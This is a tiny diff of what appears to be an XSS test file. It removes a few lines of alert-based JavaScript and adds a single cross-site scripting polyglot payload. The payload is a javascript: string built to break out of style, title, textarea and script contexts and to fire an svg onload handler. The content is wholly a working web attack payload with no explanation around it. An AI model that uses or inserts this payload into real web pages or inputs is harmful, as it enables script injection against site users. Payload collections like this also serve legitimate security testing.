@@ -1,6 +1,1 @@
-var a='2333'; 
-alert(a);
-var obj = document.createElement("img");
-obj.src ="http://www.baidu.com/images/logo.gif";
-obj.onerror=alert(99999);
-
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(2333) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(2333)//>\x3e
